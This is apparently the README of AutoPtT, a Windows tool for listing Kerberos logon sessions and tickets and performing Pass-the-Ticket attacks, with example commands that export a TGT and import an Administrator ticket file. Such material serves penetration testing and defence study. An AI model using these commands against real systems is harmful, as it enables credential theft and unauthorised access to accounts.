# AutoPtT

Enumerate Kerberos tickets and perform Pass-the-Ticket (PtT) attacks interactively in C++ or Python.


You can do this step by step or automatically using the following options:

- **`auto`** - Automated Pass-the-Ticket attack

- **`sessions`** - List logon sessions. Similar to running `klist sessions`

- **`klist`** - List tickets in the current session. Similar to running `klist`

- **`tickets`** - List tickets in all sessions (not only TGTs). Similar to running `Rubeus.exe dump`

- **`export`** - Export a TGT given the LogonId. Similar to running `Rubeus.exe dump`

- **`ptt`** - Import a ticket file given the file name. Similar to running `Rubeus.exe ptt`


<br>

-----------------------------------------------

## Examples

#### Automated Pass-the-Ticket

Choose the index for one of the available TGTs, it gets dumped and imported into your session:

```
autoptt.exe auto
```

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_6.png)


#### List logon sessions

```
autoptt.exe sessions
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_1.png)


#### List tickets in the current session

```
autoptt.exe klist
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_2.png)


#### List tickets in all sessions

```
autoptt.exe tickets
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_3.png)


#### Export TGT given the LogonId (in this case, 0x5f7d0)

```
autoptt.exe export 0x5f7d0
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_4.png)

#### Import ticket file given the file name

```
autoptt.exe ptt 0x5f7d0_Administrator.kirbi
```

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/autoptt/Screenshot_5.png)


<br>

-----------------------------------------------

## Acknowledgments

Heavily inspired by and adapted from:

- [Mimikatz](https://github.com/gentilkiwi/mimikatz) by **Benjamin Delpy** ([@gentilkiwi](https://github.com/gentilkiwi))

- [Rubeus](https://github.com/GhostPack/Rubeus) by **Will Schroeder** ([@harmj0y](https://github.com/harmj0y)) and **Lee Christensen** ([@leechristensen](https://github.com/leechristensen))

- klist utility by **Microsoft**

<br>
